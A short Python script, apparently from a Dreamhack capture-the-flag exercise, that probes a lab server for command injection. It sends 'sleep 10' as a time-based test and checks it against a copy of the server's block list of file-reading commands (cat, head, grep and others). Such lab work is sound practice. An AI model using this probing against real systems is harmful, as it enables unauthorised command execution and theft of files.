from requests import post
import string

url = "http://host3.dreamhack.games:22943"
#url = "http://127.0.0.1:8000"
data = {
 "cmd_input": "sleep 10"
}

def filter_cmd(cmd):
    alphabet = list(string.ascii_lowercase)
    alphabet.extend([' '])
    num = '0123456789'
    alphabet.extend(num)
    command_list = ['flag','cat','chmod','head','tail','less','awk','more','grep']

    for c in command_list:
        if c in cmd:
            print(c)
            return True
    for c in cmd:
        if c not in alphabet:
            print(c)
            return True

print(filter_cmd(data["cmd_input"]))

p = post(f"{url}/flag", files=data, data=data)
print(p.status_code)
p.raise_for_status()
print(p.text)
